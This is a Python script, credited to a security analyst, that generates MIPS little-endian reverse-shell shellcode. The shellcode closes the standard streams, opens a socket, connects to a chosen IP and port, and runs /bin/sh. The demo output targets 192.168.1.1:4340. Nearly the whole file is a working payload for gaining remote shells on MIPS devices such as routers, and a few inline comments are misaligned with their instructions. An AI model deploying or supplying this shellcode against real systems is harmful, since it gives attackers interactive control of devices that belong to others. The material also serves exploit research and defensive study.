#!/usr/bin/env python

# MIPS Little Endian Reverse Shell ASM File and Assembled Shellcode
# Written by Jacob Holcomb, Security Analyst @ Independent Security Evaluators
# Blog: http://infosec42.blogspot.com
# Company Website: http://securityevaluators.com

import struct
import socket

def make_shellcode(dst_ip, dst_port):
    host = socket.ntohl(struct.unpack('I', socket.inet_aton(dst_ip))[0])
    ip = struct.unpack('cccc', struct.pack('<L', host))
    port = struct.unpack('cccc', struct.pack('<L', dst_port))

    # Close stdin(0)
    mipsel_shell  = "\xff\xff\x04\x28"  # slti $a0, $zero, 0xFFFF
    mipsel_shell += "\xa6\x0f\x02\x24"  # li $v0, 4006
    mipsel_shell += "\x0c\x09\x09\x01"  # syscall 0x42424

    # Close stdout(1)
    mipsel_shell += "\x11\x11\x04\x28"  # slti $a0, $zero, 0x1111
    mipsel_shell += "\xa6\x0f\x02\x24"  # li $v0, 4006
    mipsel_shell += "\x0c\x09\x09\x01"  # syscall 0x42424

    # Close stderr(2)
    mipsel_shell += "\xfd\xff\x0c\x24"  # li $t4, 0xFFFFFFFD #-3
    mipsel_shell += "\x27\x20\x80\x01"  # not $a0, $t4
    mipsel_shell += "\xa6\x0f\x02\x24"  # li $v0, 4006
    mipsel_shell += "\x0c\x09\x09\x01"  # syscall 0x42424

    # Socket Domain - AF_INET (2)
    mipsel_shell += "\xfd\xff\x0c\x24"  # li $t4, 0xFFFFFFFD #-3
    mipsel_shell += "\x27\x20\x80\x01"  # not $a0, $t4
    # #Socket Type - SOCK_STREAM (2 for mips)
    mipsel_shell += "\x27\x28\x80\x01"  # not $a1, $t4
    # #Socket Protocol - 0
    mipsel_shell += "\xff\xff\x06\x28"  # slti $a2, $zero, 0xFFFF
    # #Call socket
    mipsel_shell += "\x57\x10\x02\x24"  # li $v0, 4183
    mipsel_shell += "\x0c\x09\x09\x01"  # syscall 0x42424

    # Move socket return value (v0) to register a0
    # V0 must be below 0xFFFF/65535
    mipsel_shell += "\xff\xff\x44\x30"  # andi $a0, $v0, 0xFFFF

    # Calling dup three times
    # Duplicate FD (stdin)
    # Socket returned fd 0 - stdin goes to socket

    # Duplicate FD (stdout)
    mipsel_shell += "\xc9\x0f\x02\x24"  # li $v0, 4041
    mipsel_shell += "\x0c\x09\x09\x01"  # syscall 0x42424
    # Duplicate FD (stderr)
    mipsel_shell += "\xc9\x0f\x02\x24"  # li $v0, 4041
    mipsel_shell += "\x0c\x09\x09\x01"  # syscall 0x42424

    # Connect sockfd
    # Socket FD is already in a0

    # Connect sockaddr
    mipsel_shell += struct.pack('2c',port[1], port[0]) + "\x05\x3c"  # lui $a1, 0x6979 #Port:
    mipsel_shell += struct.pack('2c',port[1], port[0]) + "\xa5\x34"  # ori $a1, 0xFF01 #31337
    # mipsel_shell += "\x01\x01\xa5\x20"  # addi $a1, $a1, 0x0101 # 0x6979+0x0101=0x697A
    mipsel_shell += "\xf8\xff\xa5\xaf"  # sw $a1, -8($sp)

    mipsel_shell += struct.pack('2c',ip[1], ip[0]) + "\x05\x3c"  # li $a1, 0xB101A8C0 #192.168.1.177
    mipsel_shell += struct.pack('2c',ip[3], ip[2]) + "\xa5\x34"  # sw $a1, -4($sp)
    mipsel_shell += "\xfc\xff\xa5\xaf"  # addi $a1, $sp, -8

    # Connect addrlen - 16
    mipsel_shell += "\xf8\xff\xa5\x23"  # li $t4, 0xFFFFFFEF #-17
    mipsel_shell += "\xef\xff\x0c\x24"  
    mipsel_shell += "\x27\x30\x80\x01"  # not $a2, $t4

    # Call connect
    mipsel_shell += "\x4a\x10\x02\x24"  # li $v0, 4170
    mipsel_shell += "\x0c\x09\x09\x01"  # syscall 0x42424
    # Putting /bin/sh onto the stack
    mipsel_shell += "\x62\x69\x08\x3c"  # lui $t0, 0x6962 #Loading Upper Immediate - ib
    mipsel_shell += "\x2f\x2f\x08\x35"  # ori $t0, $t0,0x2f2f #Bitwise OR Immediate - //
    mipsel_shell += "\xec\xff\xa8\xaf"  # sw $t0, -20($sp) #Store word pointer to command string for execution
    mipsel_shell += "\x73\x68\x08\x3c"  # lui $t0, 0x6873 #Loading Upper Immediate - hs
    mipsel_shell += "\x6e\x2f\x08\x35"  # ori $t0, 0x2f6e #Bitwise OR Immediate - /n
    mipsel_shell += "\xf0\xff\xa8\xaf"  # sw $t0, -16($sp) #Store word pointer to command string for execution
    mipsel_shell += "\xff\xff\x07\x28"  # slti $a3, $zero, 0xFFFF #Putting null (0) onto stack
    mipsel_shell += "\xf4\xff\xa7\xaf"  # sw $a3, -12($sp)
    mipsel_shell += "\xfc\xff\xa7\xaf"  # sw $a3, -4($sp)

    # execve *filename
    mipsel_shell += "\xec\xff\xa4\x23"  # addi $a0, $sp, -20
    # execve *argv[]
    mipsel_shell += "\xec\xff\xa8\x23"  # addi $t0, $sp, -20
    mipsel_shell += "\xf8\xff\xa8\xaf"  # sw $t0, -8($sp)
    mipsel_shell += "\xf8\xff\xa5\x23"  # addi $a1, $sp, -8
    mipsel_shell += "\xec\xff\xbd\x27"  # addiu $sp, $sp, -20 #Adjusting stack
    mipsel_shell += "\xff\xff\x06\x28"  # slti $a2, $zero, 0xFFFF
    # execve envp[] - 0
    # Call execve
    mipsel_shell += "\xab\x0f\x02\x24"  # #Call execve
    mipsel_shell += "\x0c\x09\x09\x01"  # syscall 0x42424

    return mipsel_shell

if __name__ == '__main__':
    print make_shellcode("192.168.1.1", 4340)